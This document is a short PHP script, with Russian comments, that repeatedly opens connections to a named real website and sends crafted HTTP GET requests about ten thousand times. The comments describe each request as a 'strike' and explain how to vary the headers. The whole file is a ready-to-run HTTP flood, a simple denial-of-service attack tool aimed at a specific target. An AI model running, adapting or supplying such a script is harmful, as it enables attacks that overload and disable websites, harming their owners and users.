<?php 
$host = "mobneo.ru";
$path = "/index.php";
  
  
  for($r=0; $r <= 10000; $r++)
  {
  $fp = fsockopen($host,80,$errno,$errstr,30); 
  if(!$fp) echo""; 
  else{
#    $headers = "GET $path HTTP/1.0\r\n";//Раскоментируйте если хотите бить по старому протоколу 
    $headers = "GET $path HTTP/1.1\r\n"; //закоментируйте если выше раскоментировано этим знаком #
    $headers .= "Host: $host\r\n"; 
    $headers .= "Accept: *\r\n"; 
    $headers .= "Accept-Charset: *\r\n"; 
    $headers .= "Accept-Encoding: deflate\r\n"; 
    $headers .= "Accept-Language: ru\r\n";// поменять на это если англиский протокол удара     $headers .= "Accept-Language: en\r\n";  
$headers .= "User-Agent: PRIZR@K$r\r\n\r\n";//Меняем агента на свой 
    $headers .= "Connection: Keeper Alive\r\n";
    fwrite($fp,$headers);   
      }
   }
?>